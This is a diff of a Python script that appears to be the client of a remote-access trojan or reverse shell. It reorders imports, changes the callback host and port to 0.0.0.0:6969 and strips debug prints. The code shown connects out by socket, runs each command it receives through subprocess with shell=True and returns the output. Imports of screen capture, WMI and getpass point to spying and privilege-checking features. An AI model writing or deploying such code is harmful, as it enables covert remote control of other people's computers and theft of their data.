@@ -1,19 +1,20 @@
-import socket
-import subprocess
+import base64
+import getpass
 import json
 import os
-import time
 import platform
-import base64
-import requests
-from mss import mss
 # import pickle
 # import tqdm
 import shutil
+import socket
+import subprocess
 import sys
-import wmi
-import getpass
+import time
+
 import ifaddr
+import requests
+import wmi
+from mss import mss
 
 '''
 rsq -> QUIT
@@ -27,8 +28,8 @@ check -> check for admin privilege
 '''
 
 
-REMOTE_HOST = '127.0.0.1'  # '192.168.43.82'
-REMOTE_PORT = 8081  # 2222
+REMOTE_HOST = '0.0.0.0'  # '192.168.43.82'
+REMOTE_PORT = 6969  # 2222
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
@@ -276,10 +277,7 @@ def shell():
         else:
             proc = subprocess.Popen(
                 command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            # print("[-] Sending response...")
             result = proc.stdout.read() + proc.stderr.read()
-            # print(result)
-            # print(result.decode())
             send(result.decode())
 
 
